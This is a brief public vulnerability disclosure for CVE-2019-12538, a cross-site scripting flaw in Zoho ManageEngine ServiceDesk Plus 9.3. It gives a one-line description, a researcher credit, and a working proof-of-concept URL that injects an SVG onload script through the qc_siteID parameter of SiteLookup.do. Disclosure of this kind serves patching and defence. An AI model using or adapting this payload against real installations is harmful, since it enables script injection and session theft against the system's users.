# CVE-2019-12538 Zoho ManageEngine ServiceDesk Plus 9.3 XSS vulnerability in SiteLookup.do
Information Description: An issue was discovered in Zoho ManageEngine ServiceDesk Plus 9.3. There is XSS via the SiteLookup.do qc_siteID parameter. 

**Author: Concobe of Tarantula Team - VinCSS (a member of Vingroup)**

# Payload
domain/SiteLookup.do?configID=0&SELECTSITE=qc_siteID"/><svg onload=alert('XSS')>&userConfigID=1&SELECTEDSITEID=1&SELECTEDSITENAME=

